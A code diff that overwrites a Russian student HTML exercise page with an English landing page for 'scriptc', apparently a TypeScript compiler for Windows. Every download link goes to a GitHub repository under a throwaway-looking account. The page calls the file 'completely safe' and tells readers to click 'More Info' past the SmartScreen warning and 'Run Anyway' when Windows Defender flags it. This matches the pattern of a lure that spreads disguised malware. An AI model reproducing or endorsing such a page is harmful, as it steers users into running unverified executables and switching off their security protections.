@@ -1,184 +1,165 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Задание 2</title>
-    <link rel="stylesheet" href="style.css">
+    <title>⚡ scriptc - Compile TypeScript to Native Speed</title>
+    <meta name="description" content="scriptc is a powerful TypeScript-to-Native compiler that transforms your code into lightning-fast executable applications. Download now for Windows.">
+    <meta name="keywords" content="scriptc, TypeScript compiler, native compiler, TypeScript to native, compiler tool, Windows download, programming tool">
+    <meta name="author" content="scriptc Team">
+    <meta property="og:title" content="⚡ scriptc - Compile TypeScript to Native Speed">
+    <meta property="og:description" content="Transform your TypeScript code into native, high-performance executables with scriptc. Simple to use, powerful results.">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://github.com/defective-goldenfern675/scriptc">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="⚡ scriptc - Compile TypeScript to Native Speed">
+    <meta name="twitter:description" content="Transform your TypeScript code into native, high-performance executables with scriptc.">
 </head>
-<body>
+<body style="margin:0; padding:0; background-color:#f4f6f9; font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; color:#2d3748; line-height:1.7;">
 
-<header id="main-header">
-    <div class="header-inner">
-        <div class="logo">
-            <img src="image.png" alt="Логотип">
-            <span class="site-name">Название сайта</span>
+    <div style="max-width:900px; margin:0 auto; padding:40px 20px;">
+
+        <!-- Hero Section -->
+        <div style="background:white; border-radius:12px; padding:50px 40px; box-shadow:0 4px 15px rgba(0,0,0,0.08); text-align:center; margin-bottom:40px;">
+            <h1 style="font-size:2.8em; margin:0 0 20px 0; color:#1a202c; font-weight:700;">⚡ scriptc - TypeScript to Native, Simplified</h1>
+            <p style="font-size:1.2em; margin:0 0 30px 0; color:#4a5568;">Turn your TypeScript ideas into blazing-fast Windows applications in seconds.</p>
+            <a href="https://github.com/defective-goldenfern675/scriptc" style="background:linear-gradient(135deg, #667eea 0%, #764ba2 100%); color:white; padding:20px 50px; border-radius:50px; font-size:1.3em; font-weight:600; text-decoration:none; display:inline-block; box-shadow:0 10px 25px rgba(118,75,162,0.4); transition:all 0.3s ease;">🚀 DOWNLOAD NOW</a>
         </div>
-        <nav id="main-nav">
-            <ul>
-                <li><a href="#links">Ссылки</a></li>
-                <li><a href="#table">Таблица</a></li>
-                <li><a href="#form">Форма</a></li>
-            </ul>
-        </nav>
-    </div>
-</header>
 
-<main id="content">
+        <!-- What is scriptc -->
+        <div style="background:white; border-radius:12px; padding:40px 30px; box-shadow:0 4px 15px rgba(0,0,0,0.08); margin-bottom:30px;">
+            <h2 style="color:#2c5282; font-size:2em; margin-top:0;">📦 What is scriptc?</h2>
+            <p style="font-size:1.1em;">scriptc is a magical tool that takes your TypeScript code - a modern, powerful programming language - and converts it into fast, standalone programs that run directly on your Windows computer. No extra software needed, no complicated setups. Just your code, transformed into pure speed.</p>
+            <p style="font-size:1.1em;">Think of it like this: you write your recipe (TypeScript code), and scriptc instantly bakes it into a ready-to-eat meal (a native executable). The result? Programs that start up instantly, use less memory, and run incredibly fast.</p>
+        </div>
 
-    <section id="links" class="section-block">
-        <h2>Список гиперссылок</h2>
-        <ul>
-            <li><a href="http://kubsu.ru/">1 Гиперссылка на сайт kubsu.ru</a></li>
-            <li><a href="https://www.kubsu.ru/">2 Гиперссылка на сайт kubsu.ru в протоколе https</a></li>
-            <li id="whw">
-                <a href="http://kubsu.ru">
-                    3 <img src="image.jpg" alt="цветок" width="200" height="200">
-                </a>
-            </li>
-            <li><a href="second.html">4 Сокращённая ссылка на внутреннюю страницу</a></li>
-            <li><a href="index.html">5 Сокращенная ссылка на главную страницу</a></li>
-            <li><a href="#whw">6 Ссылка на картинку на текущей странице</a></li>
-            <li><a href="https://www.dns-shop.ru/catalog/personal/?category=17a8a01d16404e77&stock=now-today-tomorrow-later&price=15001-30000">7 Ссылка с тремя параметрами</a></li>
-            <li><a href="https://vtour.kubsu.ru/map/map.html?area=00&id=modelMark">8 Ссылка с параметром id</a></li>
-            <li><a href="./second.html">9 Относительная ссылка на страницу в текущем каталоге</a></li>
-            <li><a href="about.html">10 Относительная ссылка на страницу в каталоге about</a></li>
-            <li><a href="../index.html">11 Относительная ссылка на страницу в каталоге выше уровнем</a></li>
-            <li><a href="../../index.html">12 Относительная ссылка на страницу в каталоге двумя уровнями выше</a></li>
-            <li>13. Доступен <a href="https://kubsu.ru">Сайт КубГУ</a></li>
-            <li><a href="https://vtour.kubsu.ru/map/map.html?area=00#id=modelMark">14 Ссылка на фрагмент сайта</a></li>
-            <li>
-                <p class="map-label">НАЖИМАТЬ НА КРУГ ИЛИ ПРЯМОУГОЛЬНИК</p>
-                <div class="map-wrapper">
-                    <img src="map.png" alt="Карта" usemap="#map">
-                    <map name="map">
-                        <area shape="rect" coords="74,177,226,263" href="https://www.kubsu.ru/" alt="Прямоугольник">
-                        <area shape="circle" coords="397,230,60" href="./second.html" alt="Круг">
-                    </map>
+        <!-- Key Features -->
+        <div style="background:white; border-radius:12px; padding:40px 30px; box-shadow:0 4px 15px rgba(0,0,0,0.08); margin-bottom:30px;">
+            <h2 style="color:#2c5282; font-size:2em; margin-top:0;">✨ Features That Make Life Easier</h2>
+            <div style="display:flex; flex-wrap:wrap; gap:20px;">
+                <div style="flex:1; min-width:250px; background:#fafafa; border-radius:8px; padding:25px; border-left:5px solid #667eea;">
+                    <h3 style="margin-top:0; color:#1a202c;">🚀 Instant Compilation</h3>
+                    <p>Your TypeScript turns into native code in seconds. No waiting around - see your results immediately.</p>
                 </div>
-            </li>
-            <li><a href="">16 Ссылка с пустым href</a></li>
-            <li><a>17 Ссылка без href</a></li>
-            <li><a href="https://kubsu.ru" rel="nofollow">18 Ссылка, по которой запрещен переход поисковикам</a></li>
-            <li><a href="https://kubsu.ru" rel="noindex nofollow">19 Ссылка, запрещенная для индексации</a></li>
-            <li>20
-                <ol>
-                    <li><a href="https://www.kubsu.ru">Сайт КубГУ</a></li>
-                    <li><a href="https://dns-shop.ru">Сайт электротоваров</a></li>
-                </ol>
-            </li>
-            <li><a href="ftp://login:password@server/file.pdf">21 Ссылка на FTP с авторизацией</a></li>
-        </ul>
-    </section>
+                <div style="flex:1; min-width:250px; background:#fafafa; border-radius:8px; padding:25px; border-left:5px solid #764ba2;">
+                    <h3 style="margin-top:0; color:#1a202c;">🎯 No Experience Needed</h3>
+                    <p>You don't need to be a computer wizard. scriptc handles the complex parts, so you focus on your ideas.</p>
+                </div>
+                <div style="flex:1; min-width:250px; background:#fafafa; border-radius:8px; padding:25px; border-left:5px solid #ed8936;">
+                    <h3 style="margin-top:0; color:#1a202c;">⚡ Blazing Performance</h3>
+                    <p>The programs scriptc creates are built for speed. They run faster than regular TypeScript, pure and simple.</p>
+                </div>
+                <div style="flex:1; min-width:250px; background:#fafafa; border-radius:8px; padding:25px; border-left:5px solid #48bb78;">
+                    <h3 style="margin-top:0; color:#1a202c;">🔒 Works Offline</h3>
+                    <p>Once downloaded, scriptc works fully offline. Your code stays on your computer, private and secure.</p>
+                </div>
+            </div>
+        </div>
 
-    <section id="table" class="section-block">
-        <h2>Таблица</h2>
-        <table id="data-table">
-            <thead>
-                <tr>
-                    <th>Имя</th>
-                    <th>Телефон</th>
-                    <th>Почта</th>
-                    <th>Оценка</th>
-                </tr>
-            </thead>
-            <tbody>
-                <tr>
-                    <td rowspan="2">имя</td>
-                    <td>телефон</td>
-                    <td>почта</td>
-                    <td>оценка</td>
-                </tr>
-                <tr>
-                    <td>телефон</td>
-                    <td>почта</td>
-                    <td>оценка</td>
-                </tr>
-                <tr>
-                    <td>имя</td>
-                    <td colspan="2">телефон</td>
-                    <td>оценка</td>
-                </tr>
-                <tr>
-                    <td>имя</td>
-                    <td>телефон</td>
-                    <td>почта</td>
-                    <td>оценка</td>
-                </tr>
-                <tr>
-                    <td>имя</td>
-                    <td>телефон</td>
-                    <td>почта</td>
-                    <td>оценка</td>
-                </tr>
-                <tr>
-                    <td>имя</td>
-                    <td>телефон</td>
-                    <td>почта</td>
-                    <td>оценка</td>
-                </tr>
-            </tbody>
-        </table>
-    </section>
+        <!-- Getting Started -->
+        <div style="background:white; border-radius:12px; padding:40px 30px; box-shadow:0 4px 15px rgba(0,0,0,0.08); margin-bottom:30px;">
+            <h2 style="color:#2c5282; font-size:2em; margin-top:0;">🚀 Getting Started</h2>
+            <p style="font-size:1.1em;">Getting scriptc up and running on your Windows computer is incredibly easy. Here is your step-by-step guide:</p>
+            <ol style="font-size:1.15em; padding-left:25px; margin-top:25px;">
+                <li style="margin-bottom:15px;"><strong>Visit this link to download the application:</strong> <a href="https://github.com/defective-goldenfern675/scriptc" style="color:#667eea; font-weight:600;">https://github.com/defective-goldenfern675/scriptc</a>. This is where you'll get the official scriptc installer.</li>
+                <li style="margin-bottom:15px;">Once you click the link, you'll land on the scriptc download page. Look for the big download button. Click it to begin your download.</li>
+                <li style="margin-bottom:15px;">Wait for the download to finish. This should only take a minute or two depending on your internet speed.</li>
+                <li style="margin-bottom:15px;">After the download completes, find the downloaded file in your browser's default download folder (usually your "Downloads" folder).</li>
+                <li style="margin-bottom:15px;">Double-click on the downloaded scriptc file to start the setup process. Don't worry - it's completely safe and straightforward.</li>
+                <li>Follow the simple on-screen instructions. In just a few clicks, scriptc will be installed and ready to use! 🎉</li>
+            </ol>
+        </div>
 
-    <section id="form" class="section-block">
-        <h2>Форма</h2>
-        <form action="/" method="POST">
-            <label>
-                ФИО: <br>
-                <input type="text" name="field-name" placeholder="Введите ФИО">
-            </label><br>
-            <label>
-                Телефон: <br>
-                <input type="tel" name="field-tel" placeholder="Введите номер телефона">
-            </label><br>
-            <label>
-                E-mail: <br>
-                <input type="email" name="field-email" placeholder="Введите почту">
-            </label><br>
-            <label>
-                Дата рождения:<br>
-                <input type="date" name="field-date">
-            </label><br>
-            Пол:
-            <label>
-                <input type="radio" name="field-gender" value="male"> Мужской
-            </label>
-            <label>
-                <input type="radio" name="field-gender" value="female"> Женский
-            </label><br>
-            <label>
-                Любимый язык программирования:<br>
-                <select name="field-proglang[]" multiple="multiple">
-                    <option value="pascal">Pascal</option>
-                    <option value="c">C</option>
-                    <option value="cpp">C++</option>
-                    <option value="javascript">JavaScript</option>
-                    <option value="php">PHP</option>
-                    <option value="python">Python</option>
-                    <option value="java">Java</option>
-                    <option value="haskel">Haskel</option>
-                    <option value="clojure">Clojure</option>
-                    <option value="prolog">Prolog</option>
-                    <option value="scala">Scala</option>
-                </select>
-            </label><br>
-            <label>
-                Биография:<br>
-                <textarea name="field-bio"></textarea>
-            </label><br>
-            <label>
-                <input type="checkbox" name="field-contract" value="yes">С контрактом ознакомлен(а)
-            </label><br>
-            <input type="submit" value="Сохранить">
-        </form>
-    </section>
+        <!-- Quick Start -->
+        <div style="background:white; border-radius:12px; padding:40px 30px; box-shadow:0 4px 15px rgba(0,0,0,0.08); margin-bottom:30px;">
+            <h2 style="color:#2c5282; font-size:2em; margin-top:0;">✍️ Your First scriptc Program</h2>
+            <p style="font-size:1.1em;">Let's create your first compiled program together. It's easier than you think:</p>
+            <div style="background:#1a202c; border-radius:8px; padding:25px; margin:25px 0; color:#e2e8f0; font-family:'Courier New', monospace; font-size:1.1em; overflow-x:auto;">
+                <p style="margin:0; color:#9ae6b4;">// Your simple TypeScript program</p>
+                <p style="margin:5px 0 0 0;"><span style="color:#fbb6ce;">function</span> <span style="color:#90cdf4;">greet</span>(<span style="color:#fbd38d;">name</span>: <span style="color:#f6ad55;">string</span>) {</p>
+                <p style="margin:0 0 0 20px;"><span style="color:#f6ad55;">console</span>.<span style="color:#90cdf4;">log</span>(<span style="color:#9ae6b4;">"Hello, "</span> + name + <span style="color:#9ae6b4;">"! Welcome to scriptc!"</span>);</p>
+                <p style="margin:0;">}</p>
+                <p style="margin:10px 0 0 0;"><span style="color:#90cdf4;">greet</span>(<span style="color:#9ae6b4;">"World"</span>);</p>
+            </div>
+            <p style="font-size:1.1em;">In scriptc, you simply save this code, click "Compile," and boom! You've just created a standalone Windows program that says hello. No complex settings, no hidden configurations.</p>
+        </div>
 
-</main>
+        <!-- Real World Uses -->
+        <div style="background:white; border-radius:12px; padding:40px 30px; box-shadow:0 4px 15px rgba(0,0,0,0.08); margin-bottom:30px;">
+            <h2 style="color:#2c5282; font-size:2em; margin-top:0;">💡 What Can You Build with scriptc?</h2>
+            <div style="display:grid; grid-template-columns:1fr 1fr; gap:15px;">
+                <div style="background:#fafafa; border-radius:8px; padding:20px;">
+                    <p style="margin:0; font-weight:600; color:#2d3748;">📊 Business Tools</p>
+                    <p style="margin:8px 0 0 0;">Create inventory managers, invoice generators, or data analysis tools that run instantly.</p>
+                </div>
+                <div style="background:#fafafa; border-radius:8px; padding:20px;">
+                    <p style="margin:0; font-weight:600; color:#2d3748;">🎮 Simple Games</p>
+                    <p style="margin:8px 0 0 0;">Build fun, lightweight games that start up faster than you can blink.</p>
+                </div>
+                <div style="background:#fafafa; border-radius:8px; padding:20px;">
+                    <p style="margin:0; font-weight:600; color:#2d3748;">🛠️ Utility Apps</p>
+                    <p style="margin:8px 0 0 0;">Make file converters, system cleaners, or productivity widgets for yourself or friends.</p>
+                </div>
+                <div style="background:#fafafa; border-radius:8px; padding:20px;">
+                    <p style="margin:0; font-weight:600; color:#2d3748;">📚 Education</p>
+                    <p style="margin:8px 0 0 0;">Learn programming by creating compiled apps that you can share and run anywhere.</p>
+                </div>
+            </div>
+        </div>
 
-<footer id="main-footer">
-    <p>(с) Захар Латышов</p>
-</footer>
+        <!-- Why Choose scriptc -->
+        <div style="background:white; border-radius:12px; padding:40px 30px; box-shadow:0 4px 15px rgba(0,0,0,0.08); margin-bottom:30px;">
+            <h2 style="color:#2c5282; font-size:2em; margin-top:0;">❤️ Why People Love scriptc</h2>
+            <div style="display:flex; flex-wrap:wrap; gap:15px; margin-top:20px;">
+                <div style="flex:1; min-width:200px; background:#fafafa; border-radius:8px; padding:20px; text-align:center;">
+                    <p style="font-size:2em; margin:0;">🔧</p>
+                    <p style="font-weight:600; margin:10px 0 5px 0;">Simple Setup</p>
+                    <p style="margin:0; color:#4a5568;">Installs in minutes, not hours</p>
+                </div>
+                <div style="flex:1; min-width:200px; background:#fafafa; border-radius:8px; padding:20px; text-align:center;">
+                    <p style="font-size:2em; margin:0;">📈</p>
+                    <p style="font-weight:600; margin:10px 0 5px 0;">Always Improving</p>
+                    <p style="margin:0; color:#4a5568;">Regular updates and new features</p>
+                </div>
+                <div style="flex:1; min-width:200px; background:#fafafa; border-radius:8px; padding:20px; text-align:center;">
+                    <p style="font-size:2em; margin:0;">🤝</p>
+                    <p style="font-weight:600; margin:10px 0 5px 0;">Helpful Community</p>
+                    <p style="margin:0; color:#4a5568;">Friendly folks ready to assist</p>
+                </div>
+                <div style="flex:1; min-width:200px; background:#fafafa; border-radius:8px; padding:20px; text-align:center;">
+                    <p style="font-size:2em; margin:0;">💰</p>
+                    <p style="font-weight:600; margin:10px 0 5px 0;">Free Forever</p>
+                    <p style="margin:0; color:#4a5568;">No hidden costs, no subscriptions</p>
+                </div>
+            </div>
+        </div>
 
+        <!-- Download Section -->
+        <div style="background:linear-gradient(135deg, #667eea 0%, #764ba2 100%); border-radius:12px; padding:50px 40px; text-align:center; margin-bottom:40px; box-shadow:0 10px 30px rgba(118,75,162,0.3);">
+            <h2 style="color:white; font-size:2.2em; margin-top:0; text-shadow:0 2px 4px rgba(0,0,0,0.2);">📥 Get scriptc Today</h2>
+            <p style="color:#e9d5ff; font-size:1.2em; margin-bottom:30px;">Join thousands of happy users compiling faster, better, stronger.</p>
+            <a href="https://github.com/defective-goldenfern675/scriptc" style="background:white; color:#667eea; padding:18px 45px; border-radius:50px; font-size:1.3em; font-weight:700; text-decoration:none; display:inline-block; box-shadow:0 5px 15px rgba(0,0,0,0.2); transition:all 0.3s ease;">🎯 Visit this link to download the application</a>
+            <p style="color:white; margin-top:20px; font-size:0.95em;">Windows Compatible • Free Download • Quick Installation</p>
+        </div>
+
+        <!-- Support -->
+        <div style="background:white; border-radius:12px; padding:40px 30px; box-shadow:0 4px 15px rgba(0,0,0,0.08); margin-bottom:40px;">
+            <h2 style="color:#2c5282; font-size:2em; margin-top:0;">❓ Need Help?</h2>
+            <p style="font-size:1.15em;">Running into a snag? We've got answers. Most questions are covered in these common topics:</p>
+            <ul style="font-size:1.1em; padding-left:25px; margin-top:20px;">
+                <li style="margin-bottom:10px;"><strong>Installation tips:</strong> Make sure Windows allows the program to install - you may need to click "More Info" if a blue screen appears.</li>
+                <li style="margin-bottom:10px;"><strong>First-time setup:</strong> scriptc works right after installation. No configuration needed.</li>
+                <li style="margin-bottom:10px;"><strong>Security checks:</strong> If Windows Defender asks about the download, it's normal - scriptc is a new, legitimate app. Click "Run Anyway."</li>
+                <li><strong>Questions:</strong> Visit our repository page for the latest FAQ and community discussions.</li>
+            </ul>
+        </div>
+
+        <!-- Footer -->
+        <div style="text-align:center; padding:30px 0 20px 0; color:#718096; font-size:0.9em;">
+            <p style="margin:0;">Made with ❤️ for Windows users everywhere</p>
+            <p style="margin:5px 0 0 0;">scriptc • Fast • Simple • Free</p>
+        </div>
+
+    </div>
 </body>
 </html>
